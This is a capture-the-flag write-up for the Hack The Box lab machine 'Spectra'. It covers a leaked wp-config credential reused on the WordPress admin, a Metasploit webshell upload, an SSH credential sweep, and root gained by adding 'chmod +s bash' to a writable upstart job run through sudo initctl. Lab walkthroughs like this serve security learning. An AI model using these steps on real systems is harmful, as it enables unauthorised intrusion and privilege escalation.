# spectra

## nmap scan

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 10:29 CEST
Nmap scan report for spectra.htb (10.10.10.229)
Host is up (0.051s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.83 seconds
```

## website on port 80

The website is a simple html page with two link:

- the first one go on a wordpress blog (maybe used as a bugtracker)
- the second one says that there is a database connection error

Using gobuster on both sites ([site 1][1] [site 2][2]) we found that the second site is a wordpress site too and the `http://spectra.htb/testing/wp-content` lead to a directory traversal in which we can find the ***wp-config*** file

```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

now we have an account for mysql: ***devtest:devteam01***

running `sqlmap -d "mysql://devtest:devteam01@10.10.10.229:3306/dev"` we get `"Host is not allowed to connect to this MySQL server"` also the testing site give a database connection error and looking at config file seems it tries to connect via localhost. Maybe mysql is reachable only via `127.0.0.1`.

Another thing we can try is to login into the wp-admin on main site using the password just found and username ***administrator*** as we can see into the comment section of the homepage.

Once login we can see that Wordpress is running version 5.4.2

## Wordpress 5.4.2

At this point we are administrator of wordpress so we can upload a shell to get in the system.

Metasploit offer the `unix/webapp/wp_admin_shell_upload` plugin that is very simple to configure and use. ![configuration](images/msf_opts.png)

Launching the exploit we get a shell as nginx user.

Linpeas found an odd script for autologin that store the passwords in `/etc/autologin` in which there is a file containing the password ***SummerHereWeCome!!***

Now looking into the home directory there are some usernames:

- chronos
- katie
- nginx
- root
- user

So we can try to login via ssh using the password found before. To do so we can use the `auxiliary(scanner/ssh/ssh_login)` module of metasploit to test all the users and passwords.

And we can login via ***katie:SummerHereWeCome!!***

## Katie

Katie can run via sudo:

```bash
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

Katie can write on some files inside `/etc/init` as she is part of `developers` group.

We can modify the `/etc/init/test.conf` file as follow:

```bash
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
    chmod +s bash
end script

```

and then stop the test service via `sudo /sbin/initctl stop test` now bash has SUID bit set and we can go root using `bash -p`

![htbbadge](https://www.hackthebox.eu/badge/image/272787)
![achievement](https://www.hackthebox.eu/storage/achievements/dce4a09ba1ff2e6e289b4d0e671a6ac4.png)

[//]: #links
[1]: gobuster/main.txt
[2]: gobuster/testing.txt
